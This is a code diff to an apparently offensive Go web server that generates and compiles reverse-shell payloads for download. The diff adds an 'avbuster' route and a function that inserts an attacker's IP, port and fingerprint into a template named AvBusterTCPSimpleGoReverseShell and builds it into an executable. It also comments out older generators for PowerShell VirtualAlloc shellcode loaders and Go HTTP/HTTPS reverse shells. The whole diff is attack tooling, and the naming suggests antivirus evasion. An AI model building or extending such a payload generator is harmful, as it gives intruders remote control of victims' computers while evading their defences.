@@ -18,6 +18,7 @@ import (
 	"strings"
 	"time"
 
+	"./binarytemplates"
 	"github.com/gorilla/mux"
 )
 
@@ -31,19 +32,20 @@ type DownloadLink struct {
 
 var appconfig baseframe
 var dwnloadlink DownloadLink
-var knockertemplate, powvalloc, powrevhttp, powrev, gorevhttp, gorevhttps, gorev *template.Template
+var avbustertemplate, knockertemplate, powvalloc, powrevhttp, powrev, gorevhttp, gorevhttps, gorev *template.Template
 var basepath, outpath, exepath, exeoutpath, downloadlink string
 
 func init() {
 	appconfig = baseframe{}
 	dwnloadlink = DownloadLink{}
-	knockertemplate = template.Must(template.ParseFiles("templates/knocker.html"))
+	avbustertemplate = template.Must(template.ParseFiles("templates/avbuster.html"))
+	/*knockertemplate = template.Must(template.ParseFiles("templates/knocker.html"))
 	powvalloc = template.Must(template.ParseFiles("templates/powvalloc.html"))
 	powrevhttp = template.Must(template.ParseFiles("templates/powrevhttp.html"))
 	powrev = template.Must(template.ParseFiles("templates/powrev.html"))
 	gorev = template.Must(template.ParseFiles("templates/gorev.html"))
 	gorevhttp = template.Must(template.ParseFiles("templates/gorevhttp.html"))
-	gorevhttps = template.Must(template.ParseFiles("templates/gorevhttps.html"))
+	gorevhttps = template.Must(template.ParseFiles("templates/gorevhttps.html"))*/
 }
 func main() {
 	fmt.Println("knocker is ready ...")
@@ -301,15 +303,24 @@ func fknocker(httpw http.ResponseWriter, req *http.Request) {
 	}
 }
 
+func avbusterhomepage(httpw http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := avbustertemplate.Execute(httpw, nil)
+		if err != nil {
+			fmt.Println(err)
+		}
+	}
+}
+
 func startserver() {
 	router := mux.NewRouter()
-	router.HandleFunc("/", fknocker)
-	router.HandleFunc("/powvalloc", fpowvalloc)
+	router.HandleFunc("/", avbusterhomepage)
+	/*router.HandleFunc("/powvalloc", fpowvalloc)
 	router.HandleFunc("/powrevhttp", fpowrevhttp)
 	router.HandleFunc("/powrev", fpowrev)
 	router.HandleFunc("/gorevhttp", fgorevhttp)
 	router.HandleFunc("/gorevhttps", fgorevhttps)
-	router.HandleFunc("/gorev", fgorev)
+	router.HandleFunc("/gorev", fgorev)*/
 	router.PathPrefix("/static/css/").Handler(http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css/"))))
 	router.PathPrefix("/download/").Handler(http.StripPrefix("/download/", http.FileServer(http.Dir("download/"))))
 	router.PathPrefix("/outfiles/").Handler(http.StripPrefix("/outfiles/", http.FileServer(http.Dir("outfiles/"))))
@@ -355,6 +366,7 @@ func buildrevshellexe(exepath, gofilepath, ostype, arch string) {
 		}
 	} else {
 		//fmt.Println("About to build " + gofilepath)
+		//to do implement architecture base binary build
 		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
 		err := cmd.Start()
 		cmd.Wait()
@@ -586,6 +598,27 @@ func createpsvirtualallocpayload(rhost, rport, shellcode, saveas string) {
 	}
 	createpsvallocgofile()
 	buildexe("download/"+saveas+".exe", "outfiles/psvalloc.go")
+}
+
+func createavbusterpayload(ipandport, binarytemplate, outfilepath, downloadlink, ostype, archtype, fprint string) {
+
+	ipandportreplaced := strings.Replace(binarytemplate, "REVIPPORT", ipandport, 1)
+	finalval := strings.Replace(ipandportreplaced, "FPRINT", fprint, 1)
+
+	newFile, err := os.Create(outfilepath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer newFile.Close()
+	newFile.WriteString(finalval)
+
+	if ostype != "" && archtype != "" {
+		//fmt.Println("bulding " + downloadlink)
+		//fmt.Println("buiulding " + sourcefilelink)
+		buildrevshellexe(downloadlink, outfilepath, ostype, archtype)
+	} else {
+		buildexe(downloadlink, outfilepath)
+	}
 }
 
 // creategopayload("basefiles/gorevhttp.go","outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
@@ -868,8 +901,8 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 				exeoutpath = filepath.FromSlash("outfiles/shadow.go")
 				createrevgoshell("manager/httpsrev.go", "outfiles/httpsrev.go", rport, true)
 			}
-			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, ostype, archtype, fprint)
-
+			//creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, ostype, archtype, fprint)
+			createavbusterpayload(rhost+":"+rport, binarytemplates.AvBusterTCPSimpleGoReverseShell, outpath, exepath, ostype, archtype, fprint)
 			//time.Sleep(5000 * time.Millisecond)
 			/*dwnloadlink.Link = downloadlink
 			gofiles, err := filepath.Glob("outfiles/*.go")
